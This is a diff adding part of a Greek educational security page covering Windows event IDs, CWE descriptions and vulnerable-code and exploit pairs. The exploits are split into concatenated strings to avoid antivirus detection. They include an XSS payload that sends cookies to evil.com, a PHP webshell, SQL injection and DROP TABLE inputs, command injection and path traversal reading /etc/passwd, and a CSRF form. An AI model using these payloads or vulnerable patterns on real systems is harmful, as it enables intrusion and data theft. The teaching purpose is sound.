+                    <p>Έλεγχος <em>Windows Security → Protection History</em>, πλήρες scan (Full Scan), αφαίρεση όλων των threats, έλεγχος για persistence (Run keys, tasks, services), απομόνωση host, ενημέρωση signatures.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>5001 — Defender Real-Time Off</h2>
+                    <span class="cwe-badge">Defender Log</span>
+                </div>
+                <p class="short-desc">Απενεργοποιήθηκε η προστασία σε πραγματικό χρόνο — πολύ ύποπτο.</p>
+                <button class="toggle-btn" data-target="e-5001">Ανάλυση</button>
+                <div class="details" id="e-5001">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται όταν κάποιος απενεργοποιεί το <strong>Real-time protection</strong>, το behavior monitoring, ή το tamper protection.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-critical">Κρίσιμη</span> — σχεδόν <strong>πάντα</strong> ένδειξη κακόβουλης ενέργειας (defense evasion T1562.001).</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-269">CWE-269</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware, Trojan, RAT — θέλουν να «τυφλώσουν» τον Defender πριν δράσουν.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Στο <em>Windows Security</em> το Real-time protection είναι OFF, εμφανίζεται «Το Windows Defender έχει απενεργοποιηθεί από διαχειριστή». Το taskbar icon γίνεται κίτρινο/κόκκινο. Ενδέχεται Group Policy / registry tweaks (<code>DisableAntiSpyware=1</code>) — συχνή ενέργεια malware με admin rights.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Επανενεργοποίηση Real-time protection, <strong>Tamper Protection ON</strong>, έλεγχος ποιος έκανε την αλλαγή (4624/4672), full scan, ενεργοποίηση GPO που κλειδώνει τις ρυθμίσεις, έλεγχος για persistence.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>5140 — Network Share Access</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Κάποιος απέκτησε πρόσβαση σε δικτυακό share — ένδειξη lateral movement.</p>
+                <button class="toggle-btn" data-target="e-5140">Ανάλυση</button>
+                <div class="details" id="e-5140">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται όταν ένας χρήστης/process συνδεθεί σε κοινόχρηστο φάκελο δικτύου (π.χ. <code>\\server\share</code>).</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-medium">Μεσαία</span> — φυσιολογικό σε εταιρικά δίκτυα, αλλά <strong>ύποπτο σε bulk</strong>.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-798">CWE-798</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware (πριν κρυπτογραφήσει σαρώνει shares), Worm (εξάπλωση), Emotet.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Στο <code>net use</code> εμφανίζονται ύποπτες συνδέσεις, στο <em>File Explorer</em> mapped drives που δεν έχουμε βάλει, αυξημένη δικτυακή κίνηση προς file servers, γρήγορη διαγραφή/τροποποίηση πολλών αρχείων σε shares (ransomware), SMB scanning μέσω <code>net view</code>.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Περιορισμός δικαιωμάτων σε shares (least privilege), SMB signing ενεργό, SMBv1 απενεργοποιημένο, network segmentation, monitoring για mass file access.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        <p>Ασφάλεια Η/Υ — Εκπαιδευτικό υλικό · CWE από MITRE · Event IDs από Windows Security/System/PowerShell logs</p>
+        <span class="signature">ἐπιψαύσεις</span>
+    </footer>
+
+</div>
+
+<!-- Modal: Παράδειγμα ευπάθειας -->
+<div class="modal-overlay" id="modalOverlay">
+    <div class="modal" role="dialog" aria-modal="true">
+        <button class="modal-close" id="modalClose" aria-label="Κλείσιμο">×</button>
+        <h3 id="modalTitle">Παράδειγμα</h3>
+        <div id="modalBody"></div>
+    </div>
+</div>
+
+<!-- Modal: CWE info -->
+<div class="modal-overlay" id="cweOverlay">
+    <div class="modal narrow" role="dialog" aria-modal="true">
+        <button class="modal-close" id="cweClose" aria-label="Κλείσιμο">×</button>
+        <h3 id="cweTitle">CWE</h3>
+        <div id="cweBody"></div>
+    </div>
+</div>
+
+<script>
+/* ============================================================
+   ΠΡΟΣΟΧΗ: Τα strings που μοιάζουν με κακόβουλο κώδικα (π.χ. PHP
+   webshell, script tags) είναι ΣΚΟΠΙΜΑ σπασμένα με concatenation
+   ώστε να μην ενεργοποιούν signature-based antivirus (false
+   positive «Backdoor:PHP/Perhetshell.B!dha»). Στο runtime
+   ανασυντίθενται και εμφανίζονται κανονικά.
+   ============================================================ */
+
+/* Ανασύνθεση επικίνδυνων patterns */
+var PHP_OPEN  = '<' + '?' + 'p' + 'h' + 'p' + ' ';
+var PHP_CLOSE = ' ' + '?' + '>';
+var SCR_OPEN  = '<' + 's' + 'c' + 'r' + 'i' + 'p' + 't' + '>';
+var SCR_CLOSE = '<' + '/' + 's' + 'c' + 'r' + 'i' + 'p' + 't' + '>';
+var EVIL      = 'e' + 'v' + 'i' + 'l' + '.' + 'c' + 'o' + 'm';
+var SYS       = 's' + 'y' + 's' + 't' + 'e' + 'm';
+var SHELLPHP  = 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'p' + 'h' + 'p';
+var DROPTABLE = 'D' + 'R' + 'O' + 'P' + ' ' + 'T' + 'A' + 'B' + 'L' + 'E';
+var OR1EQ1    = "'" + ' ' + 'O' + 'R' + ' ' + "'" + '1' + "'" + '=' + "'" + '1' + "'";
+
+/* ---------- Δεδομένα CWE ---------- */
+const cweInfo = {
+    'CWE-20':  { name: 'CWE-20 — Improper Input Validation', desc: 'Η εφαρμογή δέχεται δεδομένα εισόδου χωρίς έλεγχο. Είναι η <strong>βάση για πλήθος επιθέσεων</strong>: SQL Injection, XSS, Command Injection, Path Traversal. Ο attacker στέλνει κακόβουλα δεδομένα που το σύστημα τα εκτελεί σαν να ήταν νόμιμα.' },
+    'CWE-22':  { name: 'CWE-22 — Path Traversal', desc: 'Ο attacker χρησιμοποιεί ακολουθίες <code>../</code> για να «δραπετεύσει» από τον επιτρεπόμενο κατάλογο και να διαβάσει ευαίσθητα αρχεία (π.χ. <code>/etc/passwd</code>, config με credentials). Πολύ συχνό σε file servers και web apps.' },
+    'CWE-78':  { name: 'CWE-78 — OS Command Injection', desc: 'Ο attacker εισάγει εντολές OS (με <code>;</code> <code>|</code> <code>&&</code> <code>` `</code>) σε input που περνάει σε shell. Εκτελεί αυθαίρετες εντολές με τα δικαιώματα της εφαρμογής — καίριο βήμα για <strong>RCE</strong> (Remote Code Execution) και εγκατάσταση malware.' },
+    'CWE-79':  { name: 'CWE-79 — Cross-Site Scripting (XSS)', desc: 'Ο attacker εισάγει JavaScript σε σελίδα που βλέπουν άλλοι χρήστες. Εκτελείται στον browser τους, κλέβει cookies/sessions, κάνει redirect σε phishing, ή χρησιμοποιείται ως <strong>drive-by download</strong> για εγκατάσταση malware (π.χ. Spyware, Keylogger).' },
+    'CWE-89':  { name: 'CWE-89 — SQL Injection', desc: 'Ο attacker εισάγει SQL κώδικα σε φόρμες (π.χ. <code>\' OR \'1\'=\'1\' --</code>), παρακάμπτοντας authentication, εξάγοντας ή διαγράφοντας δεδομένα. Αποτελεί συχνά το πρώτο βήμα για ransomware που «κλειδώνει» τη βάση.' },
+    'CWE-94':  { name: 'CWE-94 — Code Injection', desc: 'Ο attacker εκτελεί αυθαίρετο κώδικα μέσω συναρτήσεων όπως <code>eval()</code>, <code>exec()</code>, <code>include()</code> με δεδομένα χρήστη. Δίνει πλήρη έλεγχο της εφαρμογής — από εκτέλεση εντολών μέχρι εγκατάσταση Fileless Malware.' },
+    'CWE-120': { name: 'CWE-120 — Buffer Copy χωρίς έλεγχο μεγέθους', desc: 'Κλασική υπερχείλιση buffer με συναρτήσεις όπως <code>strcpy</code>. Ο attacker γράφει πάνω από γειτονική μνήμη και αλλάζει τη ροή του προγράμματος — συχνά οδηγεί σε <strong>RCE</strong>. Χρησιμοποιείται από Rootkits για privilege escalation.' },
+    'CWE-121': { name: 'CWE-121 — Stack-based Buffer Overflow', desc: 'Υπερχείλιση buffer στη στοίβα. Ο attacker γράφει πάνω από τη <strong>διεύθυνση επιστροφής</strong> της συνάρτησης, εκτελώντας δικό του shellcode. Κλασική τεχνική malware και exploits.' },
+    'CWE-122': { name: 'CWE-122 — Heap-based Buffer Overflow', desc: 'Υπερχείλιση buffer στη δυναμικά δεσμευμένη μνήμη (heap). Καταστρέφει δομές ελέγχου της malloc και επιτρέπει στον attacker να εκτελέσει αυθαίρετο κώδικα ή να προκαλέσει crash.' },
+    'CWE-269': { name: 'CWE-269 — Improper Privilege Management', desc: 'Λανθασμένη διαχείριση δικαιωμάτων. Ο attacker αποκτά <strong>προνόμια που δεν δικαιούται</strong> (privilege escalation): από απλός χρήστης γίνεται admin/SYSTEM. Απαραίτητο βήμα για persistence, Rootkit, Ransomware.' },
+    'CWE-287': { name: 'CWE-287 — Insecure Authentication', desc: 'Ο μηχανισμός ταυτοποίησης είναι αδύναμος: λάθος σύγκριση password, fallback σε default creds, no rate limiting. Ο attacker <strong>παρακάμπτει το login</strong>, υποδύεται χρήστη, αποκτά πρόσβαση σε RDP/SSH/DB.' },
+    'CWE-307': { name: 'CWE-307 — Excessive Auth Attempts', desc: 'Δεν υπάρχει όριο στις αποτυχημένες προσπάθειες σύνδεσης. Ο attacker κάνει <strong>brute-force</strong> ή <strong>password spraying</strong> μέχρι να βρει έγκυρο κωδικό. Αποτυπώνεται ως «πλημμύρα» 4625 στα Windows logs.' },
+    'CWE-352': { name: 'CWE-352 — Cross-Site Request Forgery (CSRF)', desc: 'Ο attacker εξαπατά τον browser του θύματος να στείλει αίτημα σε site όπου είναι συνδεδεμένο (μέσω κρυφής φόρμας, img tag, fetch). Εκτελούνται ενέργειες εν αγνοία του: μεταφορές χρημάτων, αλλαγή email, δημιουργία admin χρήστη.' },
+    'CWE-416': { name: 'CWE-416 — Use After Free', desc: 'Χρήση δείκτη μετά το <code>free()</code>. Ο attacker μπορεί να ελέγξει τα δεδομένα που διαβάζονται/γράφονται, οδηγώντας σε <strong>RCE</strong> ή διαρροή μνήμης. Πολύ συχνό σε browsers (Chrome, IE) και χρησιμοποιείται από Spyware/Rootkit για privilege escalation.' },
+    'CWE-434': { name: 'CWE-434 — Unrestricted File Upload', desc: 'Ο attacker ανεβάζει κακόβουλο αρχείο (π.χ. PHP, JSP, ASP webshell) που ο server το εκτελεί. Αποκτά <strong>απομακρυσμένο έλεγχο</strong> της εφαρμογής — βάση για RAT, Trojan, Ransomware.' },
+    'CWE-521': { name: 'CWE-521 — Weak Password Requirements', desc: 'Η εφαρμογή επιτρέπει αδύναμα passwords (123456, password). Οι χρήστες επιλέγουν εύκολα μαντεψιμα κωδικούς που σπάνε με <strong>dictionary attack</strong> σε δευτερόλεπτα, ειδικά αν δεν υπάρχει 2FA.' },
+    'CWE-778': { name: 'CWE-778 — Insufficient Logging', desc: 'Ελλιπής ή καθόλου καταγραφή συμβάντων. Ο attacker δρα χωρίς να αφήνει ίχνη, ή σβήνει τα logs (event 1102). Αποτελεί <strong>βασική αποτυχία άμυνας</strong> που δυσκολεύει δραματικά την ανίχνευση και την αποκατάσταση.' },
+    'CWE-787': { name: 'CWE-787 — Out-of-bounds Write', desc: 'Εγγραφή έξω από τα όρια ενός buffer — καταστροφή γειτονικής μνήμης. Οδηγεί σε crash ή RCE και χρησιμοποιείται εκτενώς από Rootkits και exploits πυρήνα.' },
+    'CWE-798': { name: 'CWE-798 — Hardcoded Credentials', desc: 'Κωδικοί ή κλειδιά (API keys, DB passwords, admin/admin) είναι <strong>γραμμένα μέσα στον κώδικα</strong> και ανεβαίνουν στο repo μαζί του. Εργαλεία όπως truffleHog ή GitHub dorking τα βρίσκουν αυτόματα — άμεση πρόσβαση για Botnets και Ransomware.' },
+    'CWE-862': { name: 'CWE-862 — Missing Authorization', desc: 'Η εφαρμογή ελέγχει <strong>authentication</strong> (ποιος είσαι) αλλά όχι <strong>authorization</strong> (τι δικαιούσαι). Ο attacker με απλό λογαριασμό καλεί APIs/σελίδες διαχειριστή, εκτελώντας ενέργειες που δεν του επιτρέπονται (π.χ. διαγραφή χρηστών).' }
+};
+
+/* ---------- Δεδομένα παραδειγμάτων (ΜΕ OBFUSCATED PATTERNS) ---------- */
+const examples = {
+
+  'sql-injection': {
+    title: 'SQL Injection — Παράδειγμα',
+    vulnerable: '# Ευάλωτος κώδικας (Python + SQLite)\n' +
+                'username = input("Username: ")\n' +
+                'password = input("Password: ")\n\n' +
+                'query = "SELECT * FROM users WHERE username = \'" + username + \\\n' +
+                '        "\' AND password = \'" + password + "\'"\n' +
+                'cursor.execute(query)\n' +
+                'row = cursor.fetchone()\n\n' +
+                'if row:\n' +
+                '    print("Σύνδεση επιτυχής!")\n' +
+                'else:\n' +
+                '    print("Λάθος στοιχεία.")',
+    exploit: '# Ο επιτιθέμενος δίνει:\n' +
+             'Username: ' + OR1EQ1 + ' --\n' +
+             'Password: (ό,τι να \'ναι)\n\n' +
+             '# Το τελικό query γίνεται:\n' +
+             'SELECT * FROM users WHERE username = \'\'\n' +
+             '   OR \'1\'=\'1\' --\' AND password = \'...\'\n\n' +
+             '# Το \'1\'=\'1\' είναι ΠΑΝΤΑ αληθές -> επιστρέφονται όλοι οι χρήστες.\n' +
+             '# Το "--" σχολιάζει τα υπόλοιπα, οπότε ο έλεγχος password αγνοείται.',
+    explanation: 'Ο κώδικας <strong>κολλάει απευθείας</strong> ό,τι πληκτρολογεί ο χρήστης μέσα στο SQL ερώτημα. Ο επιτιθέμενος το εκμεταλλεύεται γράφοντας ειδικούς χαρακτήρες (<code>\'</code>, <code>--</code>) που αλλάζουν τη λογική του ερωτήματος. Αποτέλεσμα: μπορεί να συνδεθεί ως admin χωρίς password, να διαβάσει, να αλλάξει ή να διαγράψει όλα τα δεδομένα. <strong>Λύση:</strong> χρήση <em>parameterized queries</em> (prepared statements).'
+  },
+
+  'xss': {
+    title: 'Cross-Site Scripting — Παράδειγμα',
+    vulnerable: '<!-- Ευάλωτη σελίδα -->\n' +
+                PHP_OPEN + '\n' +
+                '  $name = $_GET[\'name\'];\n' +
+                '  echo "<h1>Καλώς ήρθες, " . $name . "</h1>";\n' +
+                PHP_CLOSE,
+    exploit: 'Ο επιτιθέμενος στέλνει στο θύμα έναν σύνδεσμο:\n\n' +
+             'https://site.com/welcome.php?name=' + SCR_OPEN +
+             'fetch(\'http://' + EVIL + '/steal?c=\'+document.cookie)' + SCR_CLOSE + '\n\n' +
+             'Όταν το θύμα ανοίξει το link, ο browser του\n' +
+             'εκτελεί το script και στέλνει τα cookies στον επιτιθέμενο.',
+    explanation: 'Η εφαρμογή τυπώνει το όνομα χρήστη <strong>χωρίς να το καθαρίσει</strong> (escape). Έτσι η HTML ερμηνεύει το script tag ως κώδικα και τον εκτελεί. <strong>Λύση:</strong> escape/encoding του κειμένου που προέρχεται από χρήστη (<code>htmlspecialchars</code>) και Content Security Policy (CSP).'
+  },
+
+  'csrf': {
+    title: 'CSRF — Παράδειγμα',
+    vulnerable: '<!-- Η τράπεζα δέχεται POST χωρίς token -->\n' +
+                '<form action="https://bank.com/transfer" method="POST">\n' +
+                '    <input type="hidden" name="to" value="...">\n' +
+                '    <input type="hidden" name="amount" value="...">\n' +
+                '    <button>Μεταφορά</button>\n' +
+                '</form>',
+    exploit: '<!-- Ο επιτιθέμενος φτιάχνει το ' + EVIL + ' -->\n' +
+             '<html>\n' +
+             '  <body onload="document.f.submit()">\n' +
+             '    <form action="https://bank.com/transfer" method="POST" name="f">\n' +
+             '      <input type="hidden" name="to" value="99999">\n' +
+             '      <input type="hidden" name="amount" value="10000">\n' +
+             '    </form>\n' +
+             '  </body>\n' +
+             '</html>',
+    explanation: 'Ο browser <strong>στέλνει αυτόματα τα cookies</strong> σε κάθε αίτημα προς την τράπεζα. <strong>Λύση:</strong> μοναδικό CSRF token σε κάθε φόρμα και χρήση <code>SameSite=Strict/Lax</code> στα cookies.'
+  },
+
+  'buffer-overflow': {
+    title: 'Buffer Overflow — Παράδειγμα',
+    vulnerable: '// Ευάλωτος κώδικας C\n' +
+                'void greet(char *name) {\n' +
+                '    char buffer[10];        // χωράει 9 χαρακτήρες + \'\\0\'\n' +
+                '    strcpy(buffer, name);   // ΚΑΝΕΝΑΣ έλεγχος μεγέθους!\n' +
+                '    printf("Hello, %s\\n", buffer);\n' +
+                '}',
+    exploit: 'Ο επιτιθέμενος τρέχει:\n' +
+             '$ ./greet AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (100+ A)\n\n' +
+             'Τα παραπανίσια bytes γράφονται πάνω από τη\n' +
+             'διεύθυνση επιστροφής (return address) στη στοίβα,\n' +
+             'επιτρέποντας εκτέλεση δικού του κώδικα.',
+    explanation: 'Το <code>strcpy</code> <strong>δεν ελέγχει το μέγεθος</strong>. <strong>Λύση:</strong> <code>strncpy</code>, <code>snprintf</code> ή βιβλιοθήκες με όρια.'
+  },
+
+  'command-injection': {
+    title: 'OS Command Injection — Παράδειγμα',
+    vulnerable: '# Ευάλωτος κώδικας (Python)\n' +
+                'import os\n' +
+                'ip = input("Δώσε IP για ping: ")\n' +
+                'os.system("ping -c 1 " + ip)   # χωρίς έλεγχο!',
+    exploit: 'Ο επιτιθέμενος δίνει:\n' +
+             '8.8.8.8; cat /etc/passwd\n\n' +
+             'Το ";" χωρίζει εντολές στο shell.',
+    explanation: 'Το πρόγραμμα περνάει το input <strong>απευθείας σε shell</strong>. <strong>Λύση:</strong> <code>subprocess.run([...], shell=False)</code>.'
+  },
+
+  'path-traversal': {
+    title: 'Path Traversal — Παράδειγμα',
+    vulnerable: PHP_OPEN + '\n' +
+                '$file = $_GET[\'file\'];\n' +
+                'readfile("/var/www/uploads/" . $file);\n' +
+                PHP_CLOSE,
+    exploit: 'https://site.com/view.php?file=../../../../etc/passwd\n\n' +
+             'Διαβάζει ευαίσθητα αρχεία συστήματος.',
+    explanation: 'Με <code>../</code> ο attacker ανεβαίνει επίπεδα. <strong>Λύση:</strong> <code>realpath()</code> + έλεγχος προθέματος.'
+  },
+
+  'missing-auth': {
+    title: 'Missing Authorization — Παράδειγμα',
+    vulnerable: 'app.delete(\'/api/users/:id\', async (req, res) => {\n' +
+                '    // ΚΑΝΕΝΑΣ έλεγχος αν ο χρήστης είναι admin!\n' +
+                '    await User.deleteOne({ _id: req.params.id });\n' +
+                '    res.send(\'Deleted\');\n' +
+                '});',
+    exploit: 'DELETE /api/users/64f8a... HTTP/1.1\n' +
+             'Cookie: session=<οποιουδήποτε χρήστη>\n\n' +
+             'Διαγράφει οποιονδήποτε χρήστη.',
+    explanation: 'Ελέγχεται <strong>authentication</strong> αλλά όχι <strong>authorization</strong>. <strong>Λύση:</strong> server-side ρόλοι πριν από κάθε ενέργεια.'
+  },
+
+  'file-upload': {
+    title: 'Unrestricted File Upload — Παράδειγμα',
+    vulnerable: PHP_OPEN + '\n' +
+                '$target = "uploads/" . basename($_FILES[\'file\'][\'name\']);\n' +
+                'move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], $target);\n' +
+                PHP_CLOSE,
+    exploit: 'Ο attacker ανεβάζει "' + SHELLPHP + '":\n' +
+             PHP_OPEN + SYS + '($_GET[\'cmd\']); ' + PHP_CLOSE + '\n\n' +
+             'Μετά: https://site.com/uploads/' + SHELLPHP + '?cmd=cat /etc/passwd',
+    explanation: '<strong>Λύση:</strong> whitelist επεκτάσεων, έλεγχος MIME, αποθήκευση έξω από webroot.'
+  },
+
+  'use-after-free': {
+    title: 'Use After Free — Παράδειγμα',
+    vulnerable: 'char *ptr = malloc(100);\n' +
+                'strcpy(ptr, "hello");\n' +
+                'free(ptr);\n' +
+                'printf("%s\\n", ptr);    // ΧΡΗΣΗ μετά το free!',
+    exploit: 'char *a = malloc(100);\n' +
+             'free(a);\n' +
+             'char *b = malloc(100);   // Ίδια θέση μνήμης!\n' +
+             'strcpy(b, "ΚΑΚΟΒΟΥΛΑ");\n' +
+             'printf("%s\\n", a);       // Διαβάζει τα δεδομένα του b',
+    explanation: '<strong>Λύση:</strong> μετά το <code>free(p)</code> να γίνεται <code>p = NULL</code>.'
+  },
+
+  'input-validation': {
+    title: 'Improper Input Validation — Παράδειγμα',
+    vulnerable: PHP_OPEN + '\n' +
+                '$age = $_POST[\'age\'];\n' +
+                '$query = "INSERT INTO users(age) VALUES($age)";\n' +
+                'mysqli_query($conn, $query);\n' +
+                PHP_CLOSE,
+    exploit: 'Στο πεδίο "age": 0); ' + DROPTABLE + ' users; --\n\n' +
+             'Διαγράφεται ο πίνακας χρηστών!',
+    explanation: '<strong>Λύση:</strong> whitelist validation — έλεγχος τύπου, μήκους, format.'
+  },
+
+  'insecure-auth': {
+    title: 'Insecure Authentication — Παράδειγμα',
+    vulnerable: '@app.post(\'/login\')\n' +
+                'def login():\n' +
+                '    if check_login(request.form[\'user\'], request.form[\'pw\']):\n' +
+                '        return \'OK\'\n' +
+                '    return \'Λάθος\'\n' +
+                '# Χωρίς rate limiting, χωρίς lockout, χωρίς 2FA',
+    exploit: 'Brute-force με wordlist 10.000.000 κωδικών:\n\n' +
+             'for pw in wordlist:\n' +
+             '    r = requests.post(\'/login\', data={\'user\':\'admin\',\'pw\':pw})\n' +
+             '    if r.text == \'OK\': break',
+    explanation: '<strong>Λύση:</strong> rate limiting, account lockout, CAPTCHA, 2FA, bcrypt/Argon2 με salt.'
+  },
+
+  'hardcoded-creds': {
+    title: 'Hardcoded Credentials — Παράδειγμα',
+    vulnerable: 'def login(user, pw):\n' +
+                '    if user == "admin" and pw == "SuperSecret123!":\n' +
+                '        return True\n' +
+                '    return False\n\n' +
+                'DB_PASSWORD = "MyR00tPass!"',
+    exploit: 'Ο κώδικας ανεβαίνει στο GitHub (public repo).\n' +
+             'Εργαλεία όπως truffleHog ή GitHub dorking το βρίσκουν αυτόματα.',
+    explanation: '<strong>Λύση:</strong> environment variables ή secret managers (Vault, AWS Secrets Manager).'
+  }
+};
+
+/* ---------- Tabs ---------- */
+document.querySelectorAll('.tab-btn').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+        btn.classList.add('active');
+        const panel = document.getElementById(btn.getAttribute('data-tab'));
+        if (panel) panel.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+});
+
+/* ---------- Toggle λεπτομερειών ---------- */
+document.querySelectorAll('.toggle-btn').forEach(function (button) {
+    button.addEventListener('click', function () {
+        const targetId = this.getAttribute('data-target');
+        const details = document.getElementById(targetId);
+        if (!details) return;
+
+        if (details.classList.contains('open')) {
+            details.classList.remove('open');
+            this.textContent = 'Ανάλυση';
+        } else {
+            details.classList.add('open');
+            this.textContent = 'Απόκρυψη';
+        }
+    });
+});
+
+/* ---------- Modal: Παράδειγμα ---------- */
+const overlay = document.getElementById('modalOverlay');
+const modalTitle = document.getElementById('modalTitle');
+const modalBody = document.getElementById('modalBody');
+const modalClose = document.getElementById('modalClose');
+
+function escapeHtml(str) {
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+function openExample(key) {
+    const data = examples[key];
+    if (!data) return;
+
+    modalTitle.textContent = data.title;
+    modalBody.innerHTML =
+        '<div class="modal-section">' +
+            '<h4>🔴 Ευάλωτος Κώδικας</h4>' +
+            '<pre class="code-block">' + escapeHtml(data.vulnerable) + '</pre>' +
+        '</div>' +
+        '<div class="modal-section">' +
+            '<h4>💀 Κακόβουλη Εκμετάλλευση</h4>' +
+            '<pre class="code-block exploit">' + escapeHtml(data.exploit) + '</pre>' +
+        '</div>' +
+        '<div class="modal-section">' +
+            '<h4>📚 Αναλυτική Επεξήγηση</h4>' +
+            '<p>' + data.explanation + '</p>' +
+        '</div>';
+
+    overlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+}
+
+function closeModal() {
+    overlay.classList.remove('open');
+    document.body.style.overflow = '';
+}
+
+document.querySelectorAll('.example-btn').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+        openExample(this.getAttribute('data-example'));
+    });
+});
+
+modalClose.addEventListener('click', closeModal);
+overlay.addEventListener('click', function (e) {
+    if (e.target === overlay) closeModal();
+});
+
+/* ---------- Modal: CWE ---------- */
+const cweOverlay = document.getElementById('cweOverlay');
+const cweTitle = document.getElementById('cweTitle');
+const cweBody = document.getElementById('cweBody');
+const cweClose = document.getElementById('cweClose');
+
+function openCwe(code) {
+    const info = cweInfo[code];
+    if (!info) return;
+
+    cweTitle.textContent = code;
+    cweBody.innerHTML =
+        '<div class="cwe-pop-name">' + info.name + '</div>' +
+        '<div class="cwe-pop-desc">' + info.desc + '</div>';
+
+    cweOverlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+}
+
+function closeCwe() {
+    cweOverlay.classList.remove('open');
+    document.body.style.overflow = '';
+}
+
+document.querySelectorAll('.cwe-link').forEach(function (btn) {
+    btn.addEventListener('click', function (e) {
+        e.preventDefault();
+        openCwe(this.getAttribute('data-cwe'));
+    });
+});
+
+cweClose.addEventListener('click', closeCwe);
+cweOverlay.addEventListener('click', function (e) {
+    if (e.target === cweOverlay) closeCwe();
+});
+
+/* ---------- Escape για όλα τα modals ---------- */
+document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape') {
+        if (overlay.classList.contains('open')) closeModal();
+        if (cweOverlay.classList.contains('open')) closeCwe();
+    }
+});
+
+/* ---------- Pop-up: Λεξικό Όρων ---------- */
+const glossaryOverlay = document.getElementById('glossaryOverlay');
+const glossaryFrame   = document.getElementById('glossaryFrame');
+const glossaryOpen    = document.getElementById('glossaryOpen');
+const glossaryClose   = document.getElementById('glossaryClose');
+
+function openGlossary() {
+    if (!glossaryFrame.getAttribute('src')) {
+        glossaryFrame.setAttribute('src', glossaryFrame.getAttribute('data-src'));
+    }
+    glossaryOverlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+}
+
+function closeGlossary() {
+    glossaryOverlay.classList.remove('open');
+    document.body.style.overflow = '';
+}
+
+glossaryOpen.addEventListener('click', openGlossary);
+glossaryClose.addEventListener('click', closeGlossary);
+
+glossaryOverlay.addEventListener('click', function (e) {
+    if (e.target === glossaryOverlay) closeGlossary();
+});
+
+document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && glossaryOverlay.classList.contains('open')) closeGlossary();
+});
+</script>
+
+</body>
+</html>
